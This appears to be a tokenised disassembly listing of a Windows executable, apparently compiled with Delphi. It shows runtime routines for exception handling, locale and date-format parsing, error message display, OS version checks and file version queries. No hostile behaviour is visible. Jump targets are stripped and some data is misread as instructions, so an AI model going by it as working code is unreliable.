mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b1d2
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b080
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b0bc
call EnumCalendarInfoA
sub_40b1e4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b3ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403ef8
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40aeac
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_40800c
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4041b8
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3b5
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f1c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40878c
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c254
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404418
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4041c0
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403f4c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_40878c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041c0
inc ebx
jmp r-xdata
mov eax esi
call sub_4041b8
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40878c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041c0
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041c0
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041c0
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4040e0
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4041c0
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4040e0
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4041c0
sub_40b418
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b40c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c4e8
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4086b0
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404f94
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403074
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408ce8
mov eax [ ebp - 0x4 ]
call sub_408620
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4043b8
mov ebx eax
mov eax ebx
call sub_408620
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b5a0
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b418
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404f94
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_4029cc
call sub_40284c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408620
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b668
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403f4c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_40b6a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b6fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408d28
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b705
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
add esp 0xfffffff0
call sub_403448
sub_40b705
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_40b724
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405a5c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_40b760
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b7cc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405a5c
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408d28
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b7d3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
add esp 0xfffffff0
call sub_403448
sub_40b7d3
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_40b820
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028c0
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b880
test [ eax + 0xa0e0040 ] bh
push esp
inc ebp
js r-xdata
jg r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b990
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f90
jmp r-xdata
push ebx
mov eax edx
jmp sub_4038b0
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b997
lea eax [ ebp - 0x20 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b668
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b820
mov edx eax
sub_40b8f4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b990
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f90
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b997
lea eax [ ebp - 0x20 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40b9e4
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40ba7c
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bc37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404168
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4084f0
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc3e
lea eax [ ebp - 0x170 ]
call sub_403ef8
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f1c
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40bc48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bd03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b9e4
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b668
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
push ebp
call sub_40ba7c
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd0a
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
sub_40bd24
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bd14
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40ba64
mov eax [ rw-data ]
mov [ eax ] sub_40bc48
mov eax sub_40b9b0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b9cc
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bda8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403124
xor eax eax
mov [ rw-data ] eax
sub_40be28
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404168
sub_40beb8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bf8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f90
lea eax [ ebp - 0x8 ]
call j_sub_4043c4#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043b8
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bf95
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov eax ebx
call sub_4026e4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bf71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043b8
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402704
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bfa4
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c01c
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4043b8
mov edx esi
dec edx
call sub_40bfa4
sub_40c058
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4041b8
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c080
pop esi
pop ebx
retn
mov eax ebx
call sub_4041b8
mov esi eax
sub_40c080
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4041b8
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c290
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c0d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4041b8
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c290
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c290
dec eax
mov ebx eax
sub_40c168
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4041b8
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c0d8
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4041b8
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c1cc
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4041b8
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4041b8
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c0d8
mov eax esi
call sub_4041b8
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4041b8
mov [ esp ] eax
jmp r-xdata
sub_40c254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4043b8
add eax esi
dec eax
call sub_40c22c
sub_40c290
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4043b8
add eax ebx
dec eax
call sub_40c22c
add eax ebx
sub_40c2cc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4041b8
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c01c
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c300
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4041b8
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c01c
test al al
jne r-xdata
mov eax ebp
call sub_4043b8
mov dl [ esi + edi - 0x1 ]
call sub_4087d0
test eax eax
setne bl
sub_40c344
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403f4c
mov eax [ ebx ]
call sub_4041b8
mov edx eax
mov eax [ ebx ]
call sub_40c2cc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_4041c0
sub_40c384
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4043b8
push eax
mov eax esi
call sub_4043b8
mov ebp eax
mov eax ebp
pop edx
call sub_40c448
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c3bc
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407cb8
mov eax esi
call sub_4041b8
mov ebp eax
mov eax edi
mov edx ebp
call sub_404544
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_4043c4
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_4043c4
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_4043c4
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c448
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408620
mov [ esp ] eax
mov eax ebp
call sub_408620
mov edi eax
mov edx ebp
mov eax esi
call sub_4087e4
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
